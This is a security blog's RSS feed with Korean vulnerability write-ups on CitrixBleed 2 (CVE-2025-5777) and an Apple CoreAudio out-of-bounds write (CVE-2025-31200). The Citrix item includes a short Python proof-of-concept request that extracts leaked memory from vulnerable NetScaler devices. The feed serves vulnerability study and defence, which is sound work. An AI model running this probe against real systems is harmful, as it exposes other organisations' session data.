<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Tue, 26 Aug 2025 23:44:27 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-5777: Citrix ADC Memory Leak Vulnerability</title>
      <link>https://hackyboiz.github.io/2025/08/27/mungsul/2025-08-27/</link>
      <guid>https://hackyboiz.github.io/2025/08/27/mungsul/2025-08-27/</guid>
      <pubDate>Wed, 27 Aug 2025 00:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://labs.watchtowr.com/how-much-more-must-we-bl</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://labs.watchtowr.com/how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-2-cve-2025-5777/">https://labs.watchtowr.com/how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-2-cve-2025-5777/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NetScaler ADC and NetScaler Gateway 14.1 &#xBC84;&#xC804; : 14.1-43.56 &#xBBF8;&#xB9CC;</li><li>NetScaler ADC and NetScaler Gateway 13.1 &#xBC84;&#xC804; : 13.1-58.32 &#xBBF8;&#xB9CC;</li><li>NetScaler ADC 13.1-FIPS &#xBC84;&#xC804; : 13.1-37.235 &#xBBF8;&#xB9CC;</li><li>NetScaler ADC 13.1-NDcPP &#xBC84;&#xC804; : 13.1-37.235 &#xBBF8;&#xB9CC;</li><li>NetScaler ADC 12.1-FIPS &#xBC84;&#xC804; : 12.1-55.328 &#xBBF8;&#xB9CC;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VDI &#xB4F1; &#xAC00;&#xC0C1;&#xD654; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xB54C; &#xB9CE;&#xC740; &#xAE30;&#xC5C5;&#xB4E4;&#xC774; Citrix &#xC0AC;&#xC758; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xB429;&#xB2C8;&#xB2E4;. &#xCD5C;&#xADFC; Citrix &#xC758; &#xC81C;&#xD488; &#xAD6C;&#xC131;&#xC694;&#xC18C; &#xC911; &#xD558;&#xB098;&#xC778; NetScaler ADC &#xC640; NetScaler Gateway &#xC5D0;&#xC11C; Memory Leak &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACFC;&#xAC70; CitrixBleed &#xB77C;&#xACE0;&#xB3C4; &#xBD88;&#xB9B0; CVE-2023-4966 &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC774;&#xC5B4; &#xC774; &#xCDE8;&#xC57D;&#xC810;(CVE-2025-5777) &#xC740; CitrixBleed 2 &#xB85C;&#xB3C4; &#xBD88;&#xB9AC;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>PoC &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA70; &#xC5B4;&#xB5BB;&#xAC8C; Memory Leak &#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800;  <code>/p/u/doAutehntication.do</code> &#xC5D0; login &#xC774;&#xB77C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xB9CC; POST Body &#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. [1]</p><p>&#xC774;&#xD6C4;, response &#xC5D0;&#xC11C; <code>InitialValue</code> &#xB77C;&#xB294; tag &#xB0B4; &#xB0B4;&#xC6A9;&#xC744; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;. [2]</p><p>&#xC124;&#xBA85;&#xC5D0; &#xB530;&#xB974;&#xBA74;, &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC77C; &#xACBD;&#xC6B0;<code>InitialValue</code>&#xD0DC;&#xADF8; &#xC548;&#xC5D0; &#xC720;&#xCD9C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xAC12;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC751;&#xB2F5;&#xB41C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">...    url = target + <span class="hljs-string">&quot;/p/u/doAuthentication.do&quot;</span>    data = <span class="hljs-string">&quot;login&quot;</span>    headers = {        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0&quot;</span>,        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json, text/javascript, */*; q=0.01&quot;</span>,        <span class="hljs-string">&quot;Content-Length&quot;</span>: str(len(data))    }    <span class="hljs-keyword">try</span>:        req = requests.post(url, headers=headers, data=data, verify=False, allow_redirects=False, timeout=60) # [1]        <span class="hljs-keyword">if</span> req.status_code == <span class="hljs-number">200</span> and req.headers.get(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).startswith(<span class="hljs-string">&quot;application/vnd.citrix.authenticateresponse-1+xml; charset=utf-8&quot;</span>) or req.headers.get(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).startswith(<span class="hljs-string">&quot;application/xml&quot;</span>):            soup = BeautifulSoup(req.text, <span class="hljs-string">&quot;xml&quot;</span>)            initial_value_tag = soup.find(&apos;InitialValue&apos;) # [2]            <span class="hljs-keyword">if</span> initial_value_tag:                print(f<span class="hljs-string">&quot;\n    \033[91m[*] Vulnerable Target:-\n                   &lt;InitialValue&gt;\n                   {initial_value_tag.text}\n                   &lt;/InitialValue&gt;\n\033[0m&quot;</span>)  ...</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; Root Cause &#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <code>/p/u/doAuthentication.do</code> &#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xD560; &#xB54C; POST &#xD30C;&#xB77C;&#xBA54;&#xD130;&#xB85C; <code>login=username</code> &#xC640; &#xAC19;&#xC774; &#xC804;&#xB2EC;&#xC774; &#xB418;&#xB294;&#xB370;&#xC694;. &#xC751;&#xB2F5;&#xC5D0;&#xC11C; <code>InitialValue</code> &#xD0DC;&#xADF8; &#xC548;&#xC5D0;&#xB294; &#xD574;&#xB2F9; &#xD30C;&#xB77C;&#xBA54;&#xD130;&#xC758; &#xAC12; (<code>username</code>) &#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC751;&#xB2F5;&#xB418;&#xB294; &#xAC83;&#xC774; &#xC815;&#xC0C1; &#xD750;&#xB984;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC5D0; &#xAD00;&#xD55C; &#xB85C;&#xC9C1;&#xC740; &#xD574;&#xB2F9; &#xAE30;&#xB2A5;&#xC774; &#xD3EC;&#xD568;&#xB41C; <code>/netscaler/nsppe</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;. &#xD574;&#xB2F9; &#xBD80;&#xBD84; &#xB85C;&#xC9C1;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/27/mungsul/2025-08-27/1.png" alt></p><p><code>login</code> &#xD544;&#xB4DC;&#xAC00; &#xC5C6;&#xC73C;&#xBA74; null &#xB4F1;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xC5B4; <code>InitialValue</code> &#xD0DC;&#xADF8;&#xC5D0; &#xC544;&#xBB34;&#xB7F0; &#xAC12;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; Body &#xC5D0; <code>login</code> &#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xD544;&#xB4DC;&#xB294; &#xC788;&#xC73C;&#xB098; &#xAC12;&#xC774; &#xCD08;&#xAE30;&#xD654; &#xC548;&#xB41C; &#xC0C1;&#xD0DC;&#xB85C; &#xB0A8;&#xC544;&#xC788;&#xB358; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC601;&#xC5ED;&#xC774; &#xC751;&#xB2F5;&#xAC12;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC720;&#xCD9C;&#xC774; &#xB418;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://labs.watchtowr.com/how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-2-cve-2025-5777/">https://labs.watchtowr.com/how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-2-cve-2025-5777/</a></li><li><a href="https://asec.ahnlab.com/ko/tag/cve-2025-5777-ko/">https://asec.ahnlab.com/ko/tag/cve-2025-5777-ko/</a></li><li><a href="https://github.com/SleepNotF0und/CVE-2025-5777/blob/main/CVE%E2%80%912025%E2%80%915777.py">https://github.com/SleepNotF0und/CVE-2025-5777/blob/main/CVE&#x2011;2025&#x2011;5777.py</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/Citrix/">Citrix</category>
      
      <category domain="https://hackyboiz.github.io/tags/Citrix-ADC/">Citrix ADC</category>
      
      <category domain="https://hackyboiz.github.io/tags/NetScaler-Gateway/">NetScaler Gateway</category>
      
      <category domain="https://hackyboiz.github.io/tags/NetScaler-ADC/">NetScaler ADC</category>
      
      <category domain="https://hackyboiz.github.io/tags/Memory-Leak/">Memory Leak</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/27/mungsul/2025-08-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-31200 : Apple CoreAudio framework의 OOB Write로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/26/ji9umi/2025-08-26/</link>
      <guid>https://hackyboiz.github.io/2025/08/26/ji9umi/2025-08-26/</guid>
      <pubDate>Tue, 26 Aug 2025 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://support.apple.com/en-us/122282&quot;&gt;https://sup</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://support.apple.com/en-us/122282">https://support.apple.com/en-us/122282</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31200">https://nvd.nist.gov/vuln/detail/CVE-2025-31200</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><blockquote><p>&#xC601;&#xD5A5;&#xBC1B;&#xB294; &#xAE30;&#xAE30; &#xBAA9;&#xB85D;&#xC740; &#xC560;&#xD50C; &#xCDE8;&#xC57D;&#xC810; &#xB9B4;&#xB9AC;&#xC988; &#xBB38;&#xC11C; &#xCC38;&#xACE0;</p><ul><li>macOS &lt; 15.4.1</li><li>tvOS &lt; 18.4.1</li><li>visionOS &lt; 2.4.1</li><li>iOS &lt; 18.4.1</li><li>iPadOS &lt; 18.4.1</li></ul></blockquote><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>CVE-2025-31200&#xC740; &#xC560;&#xD50C; &#xC81C;&#xD488;&#xC758; &#xC624;&#xB514;&#xC624; &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; CoreAudio&#xC758; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; OOB Write &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; CVE-2025-31201&#xACFC; &#xD568;&#xAED8; In-the-wild &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD328;&#xCE58;&#xAC00; &#xC9C4;&#xD589;&#xB41C; &#xBD80;&#xBD84;&#xC740; <em>/System/Library/AudioToolbox.framework/AudioCodecs</em> &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>apac::hoa::CodecConfig::Deserialize()</code> &#xD568;&#xC218;&#xB85C; &#xC774;&#xB294; &#xACF5;&#xAC04;&#xC74C;&#xD5A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD55C; Apple Positional Audio Codec&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; <strong>Channel remapping</strong>&#xC5D0; &#xAD00;&#xD55C; &#xC774;&#xD574;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xAC04;&#xB7B5;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xBA74; &#xC7AC;&#xC0DD; &#xC2DC;&#xC2A4;&#xD15C;(&#xC2A4;&#xD53C;&#xCEE4;, &#xC774;&#xC5B4;&#xD3F0;)&#xACFC; &#xC18C;&#xC2A4; &#xC2A4;&#xD2B8;&#xB9BC;(&#xC624;&#xB514;&#xC624; &#xD30C;&#xC77C;)&#xC758; &#xCC44;&#xB110;&#xC744; &#xC77C;&#xCE58;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD574; &#xC815;&#xB82C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xB294; &#xC804;&#xCCB4; &#xD750;&#xB984;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><code>apac::hoa::CodecConfig::Deserialize()</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xBBF8;&#xD761;&#xD55C; &#xAC80;&#xC0AC;&#xB85C; &#xC778;&#xD574; OOB Write&#xAC00; &#xBC1C;&#xC0DD;</li><li><code>APACChannelRemapper::Process()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD55C; Channel remapping &#xC218;&#xD589;<ol><li>&#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xD3EC;&#xC778;&#xD130; &#xAC12;&#xC774; &#xB2F4;&#xAE34; &#xBC30;&#xC5F4;&#xC744; &#xB118;&#xACA8;&#xBC1B;&#xC73C;&#xBA70; &#xC774;&#xB294; &#xC21C;&#xC11C; &#xC815;&#xB82C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB428;</li><li>&#xC21C;&#xC11C; &#xC815;&#xB82C; &#xBC94;&#xC704;&#xC758; &#xAE30;&#xC900;&#xAC12;&#xC740; <code>mRemappingArray</code> &#xBC30;&#xC5F4;&#xC758; &#xAE38;&#xC774;</li></ol></li><li><code>mRemappingArray</code>&#xC758; &#xAE38;&#xC774;&#xAC00; &#xC804;&#xB2EC;&#xB41C; &#xBC30;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; &#xD070; &#xACBD;&#xC6B0; &#xBC94;&#xC704;&#xB97C; &#xB118;&#xC5B4;&#xC120; &#xC704;&#xCE58;&#xC5D0; &#xC811;&#xADFC; &#xC2DC;&#xB3C4;</li></ol><pre><code class="hljs cpp"><span class="hljs-number">1</span><span class="hljs-function">cfa068cc    <span class="hljs-keyword">int64_t</span> <span class="hljs-title">APACChannelRemapper::Process</span><span class="hljs-params">(struct APACChannelRemapper* <span class="hljs-keyword">this</span>, <span class="hljs-keyword">double</span>** floatVector)</span></span><span class="hljs-function"></span><span class="hljs-function">1cfa068cc    </span>{<span class="hljs-number">1</span>cfa068cc        <span class="hljs-keyword">void</span>* mRemappingStart = <span class="hljs-keyword">this</span>-&gt;mRemappingStart;<span class="hljs-number">1</span>cfa068cc        <span class="hljs-keyword">void</span>* mRemappingEnd = <span class="hljs-keyword">this</span>-&gt;mRemappingEnd;<span class="hljs-number">1</span>cfa068cc        <span class="hljs-number">1</span><span class="hljs-function">cfa068d4        <span class="hljs-title">if</span> <span class="hljs-params">(mRemappingStart != mRemappingEnd)</span></span><span class="hljs-function">1cfa068d4        </span>{<span class="hljs-number">1</span>cfa068d8            <span class="hljs-keyword">int32_t</span> i = <span class="hljs-number">0</span>;<span class="hljs-number">1</span>cfa068dc            <span class="hljs-keyword">int32_t</span> j = <span class="hljs-number">0</span>;<span class="hljs-number">1</span>cfa068dc            <span class="hljs-number">1</span>cfa0691c            <span class="hljs-keyword">do</span><span class="hljs-number">1</span>cfa0691c            {<span class="hljs-number">1</span>cfa068e0                <span class="hljs-keyword">uint64_t</span> i_1 = i;<span class="hljs-number">1</span>cfa068e0                <span class="hljs-number">1</span>cfa068ec                <span class="hljs-keyword">do</span><span class="hljs-number">1</span>cfa068e4                    i_1 = (<span class="hljs-keyword">uint64_t</span>)*(<span class="hljs-keyword">uint8_t</span>*)((<span class="hljs-keyword">char</span>*)mRemappingStart + i_1);<span class="hljs-number">1</span><span class="hljs-function">cfa068ec                 <span class="hljs-title">while</span> <span class="hljs-params">(j &lt; (<span class="hljs-keyword">uint32_t</span>)i_1)</span></span>;<span class="hljs-number">1</span>cfa068ec                <span class="hljs-number">1</span><span class="hljs-function">cfa068f0                <span class="hljs-title">if</span> <span class="hljs-params">(j != (<span class="hljs-keyword">uint32_t</span>)i_1)</span></span><span class="hljs-function">1cfa068f0                </span>{<span class="hljs-number">1</span>cfa068f4                    <span class="hljs-keyword">double</span>* x8 = *(<span class="hljs-keyword">uint64_t</span>*)floatVector;<span class="hljs-number">1</span>cfa068f8                    <span class="hljs-keyword">double</span>* x9 = x8[i];<span class="hljs-number">1</span>cfa06900                    x8[i] = x8[i_1];<span class="hljs-number">1</span>cfa06904                    x8[i_1] = x9;<span class="hljs-number">1</span>cfa06908                    mRemappingStart = <span class="hljs-keyword">this</span>-&gt;mRemappingStart;<span class="hljs-number">1</span>cfa06908                    mRemappingEnd = <span class="hljs-keyword">this</span>-&gt;mRemappingEnd;<span class="hljs-number">1</span>cfa068f0                }<span class="hljs-number">1</span>cfa068f0                <span class="hljs-number">1</span>cfa0690c                i = j + <span class="hljs-number">1</span>;<span class="hljs-number">1</span>cfa06914                j = i;<span class="hljs-number">1</span>cfa0691c            } <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">char</span>*)mRemappingEnd - mRemappingStart &gt; i);<span class="hljs-number">1</span>cfa068d4        }<span class="hljs-number">1</span>cfa068d4        <span class="hljs-number">1</span>cfa06924        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-number">1</span>cfa068cc    }</code></pre><p>&#xBC18;&#xBCF5;&#xBB38; &#xC2E4;&#xD589; &#xC2DC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC870;&#xAC74;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; <em>i</em>&#xAC00; <code>mRemappingEnd</code> <em>-</em> <code>mRemappingStart</code>&#xC758; &#xACB0;&#xACFC;&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xAC12;&#xC77C; &#xB54C; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xAC12;&#xC758; &#xBCC0;&#xACBD;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xB300;&#xC0C1;&#xC740; <code>floatVector</code> &#xBC30;&#xC5F4;&#xB85C; &#xC774;&#xB294; &#xD3EC;&#xC778;&#xD130; &#xAC12;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; <code>mRemappingArray</code>&#xC640; <code>floatVector</code> &#xBC30;&#xC5F4;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xC77C;&#xCE58;&#xD558;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9CC;&#xC57D; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF4;&#xAD00;&#xD560; &#xC218; &#xC788;&#xB294; &#xACF5;&#xAC04;&#xBCF4;&#xB2E4; &#xB354; &#xB9CE;&#xC740; &#xB370;&#xC774;&#xD130; &#xC774;&#xB3D9;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0;&#xC790; &#xD55C;&#xB2E4;&#xBA74; &#xC758;&#xB3C4;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xAC12;&#xC774; &#xBC30;&#xC5F4;&#xB85C; &#xC704;&#xCE58;&#xD558;&#xAC70;&#xB098; &#xBC18;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC785;&#xB825;&#xD55C; &#xAC12;&#xC774; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD328;&#xCE58;&#xAC00; &#xC218;&#xD589;&#xB41C; <code>apac::hoa::CodecConfig::Deserialize()</code> &#xD568;&#xC218;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xBA74; <code>mRemappingArray</code>&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE38; &#xB54C; &#xC804;&#xCCB4; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xC758; &#xC218;&#xBCF4;&#xB2E4; &#xB9CE;&#xC740; &#xACBD;&#xC6B0; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xC911;&#xB2E8;&#xD558;&#xB3C4;&#xB85D; &#xCD94;&#xAC00;&#xD558;&#xC5EC; <code>floatVector</code>&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xD06C;&#xAE30;&#xB97C; &#xAC00;&#xC9C8; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// ...</span>*(<span class="hljs-keyword">this</span>-&gt;mRemappingArray + cnt) = elem_to_add;totalComponents = <span class="hljs-keyword">this</span>-&gt;totalComponents;<span class="hljs-keyword">if</span> (totalComponents &lt;= *(<span class="hljs-keyword">this</span>-&gt;mRemappingArray + cnt) ){os_log(&#x201C;Invalid mRemappingArray bitstream in hoa::CodecConfig::Deserialize()&#x201D;);<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}<span class="hljs-keyword">if</span> ( ++cnt &gt;= totalComponents )<span class="hljs-keyword">goto</span> skipbits_and_return;                <span class="hljs-comment">// Patched</span>}<span class="hljs-comment">// ...</span></code></pre><h2 id="Takeaways"><a href="#Takeaways" class="headerlink" title="Takeaways"></a>Takeaways</h2><p>&#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD2B9;&#xBCC4;&#xD55C; &#xC810;&#xC740; &#xADF8;&#xC800; &#xD2B9;&#xC815; &#xC704;&#xCE58;&#xC5D0; &#xAC12;&#xC744; &#xC4F0;&#xB294; &#xAC83; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB370;&#xC774;&#xD130;&#xC758; &#xC704;&#xCE58; &#xAD50;&#xD658;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB3D9;&#xC2DC;&#xC5D0; &#xD2B9;&#xC815; &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC744; &#xC77D;&#xB294; &#xAC83; &#xB610;&#xD55C; &#xAC00;&#xB2A5;&#xD55C; &#xBCA1;&#xD130;&#xB77C;&#xB294; &#xD2B9;&#xC9D5;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xC704;&#xD55C; &#xC804;&#xCCB4; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC558;&#xC9C0;&#xB9CC; CVE-2025-31201&#xACFC; &#xC5F0;&#xACC4;&#xD55C; PAC &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD560; &#xAC83;&#xC774;&#xB77C; &#xBC1C;&#xD45C;&#xB41C; &#xB9CC;&#xD07C; &#xAD00;&#xC2EC;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xBCF4;&#xB294; &#xAC83;&#xB3C4; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://youtu.be/nTO3TRBW00E?si=0FZQNLXBGNqAX3up">https://youtu.be/nTO3TRBW00E?si=0FZQNLXBGNqAX3up</a></li><li><a href="https://youtu.be/RWjpM0zDJVA?si=5L1A_bBAc60vRQGk">https://youtu.be/RWjpM0zDJVA?si=5L1A_bBAc60vRQGk</a></li><li><a href="https://blog.noahhw.dev/posts/cve-2025-31200/">https://blog.noahhw.dev/posts/cve-2025-31200/</a></li><li><a href="https://github.com/zhuowei/apple-positional-audio-codec-invalid-header">https://github.com/zhuowei/apple-positional-audio-codec-invalid-header</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/macOS/">macOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apple/">Apple</category>
      
      <category domain="https://hackyboiz.github.io/tags/iOS/">iOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/OOB-Write/">OOB Write</category>
      
      <category domain="https://hackyboiz.github.io/tags/ITWh/">ITWh</category>
      
      <category domain="https://hackyboiz.github.io/tags/ji9umi/">ji9umi</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/26/ji9umi/2025-08-26/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Paper Review (USENIX ’24) Speculative DoS Attacks in Ethereum (en)</title>
      <link>https://hackyboiz.github.io/2025/08/25/bekim/review/en/</link>
      <guid>https://hackyboiz.github.io/2025/08/25/bekim/review/en/</guid>
      <pubDate>Mon, 25 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
